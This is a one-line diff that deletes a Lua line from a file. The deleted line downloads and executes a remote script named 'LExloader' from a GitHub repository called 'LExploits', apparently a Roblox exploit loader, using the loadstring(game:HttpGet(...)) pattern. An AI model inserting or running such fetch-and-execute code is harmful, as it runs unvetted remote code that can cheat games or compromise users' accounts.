@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://github.com/ItzzExcel/LExploits/raw/main/LExloader/LExloader.lua", true))()
